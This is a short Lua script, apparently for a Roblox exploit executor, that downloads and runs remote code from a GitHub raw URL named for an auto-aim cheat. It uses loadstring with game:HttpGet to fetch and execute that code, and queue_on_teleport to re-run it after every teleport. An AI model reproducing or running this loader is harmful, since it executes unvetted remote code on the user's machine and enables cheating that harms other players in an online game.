local scriptCode = [[
print("1111")

loadstring(game:HttpGet("https://raw.githubusercontent.com/xorrfiis/XORFIIAUTOAIMASSISTPC/refs/heads/main/aio.luau"))()

]]

loadstring(scriptCode)()

if queue_on_teleport then
    queue_on_teleport(scriptCode)
end
